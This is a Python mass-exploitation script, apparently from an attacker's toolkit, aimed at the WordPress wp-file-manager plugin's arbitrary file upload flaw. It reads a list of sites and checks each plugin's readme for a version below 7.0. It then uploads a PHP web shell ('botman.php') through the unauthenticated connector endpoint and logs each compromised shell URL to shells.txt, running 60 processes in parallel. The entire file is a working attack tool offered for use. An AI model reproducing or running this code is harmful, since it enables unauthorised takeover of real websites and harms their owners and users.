import os
import requests
import re
from colorama import Fore, Style, init
from multiprocessing import Pool
yl = Fore.YELLOW
red = Fore.RED
res = Style.RESET_ALL
gr = Fore.GREEN
init()



headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}


def xploit(target):
    try:
        url = target + "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        payload = {
            "cmd": "upload",
            "target": "l1_Lw"
        }

        files = {
            "upload[]": open("botman.php", "rb")
        }

        response = requests.post(url, data=payload, files=files)
        if "added" in response.text:
            print(f"{target}/wp-content/plugins/wp-file-manager/lib/files/botman.php {gr}Shell Uploaded{res}")
            with open("shells.txt", 'a') as writer:
                writer.write(target + '/wp-content/plugins/wp-file-manager/lib/files/botman.php' + '\n')
        else:
            print(f"{target} {red}Upload Failed{res}")
    except:
        pass

def chk(target):

    if "://" in target:
        target = target
    else:
        target = "http://" + target
    target = target.strip()
    try:
        resp = requests.get(target + "/wp-content/plugins/wp-file-manager/readme.txt", headers=headers, timeout=5).text
        tags = re.findall("Stable tag: \s*(\S+)", resp)[0]
        tags = float(tags)
        if tags < 7.0:
            print(f"{target} {yl}Vuln{res}")
            xploit(target)
        else:
            print(f"{target} {red}Not vuln{res}")
    except:
       print(f"{target} {red}Filemanager Not Installed{res}")


def main():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    banner = f'''
        {red}    ×××××××××××××××××××××××××××××××××××××××××××××××××××××××××
        {red}    ×                                                       ×
        {red}    ×        {gr}         WP-FILEMANAGER EXPLOIT {red}               ×
        {red}    ×        {gr}          CODED BY HARRY_1337 {red}                 ×
        {red}    ×        {gr}           TG- @botmanarmy {red}                    ×
        {red}    ×××××××××××××××××××××××××××××××××××××××××××××××××××××××××
           {gr}       <WP-FILEMANAGER ARBITRARY FILE UPLOAD>{res}         
          '''
    print(banner)
    target = input(f"{gr}enter list : ")
    target = open(target, 'r').readlines()
    try:
        ThreadPool = Pool(60)
        ThreadPool.map(chk, target)
        ThreadPool.close()
        ThreadPool.join()
    except:
        pass
if __name__ == '__main__':
    main()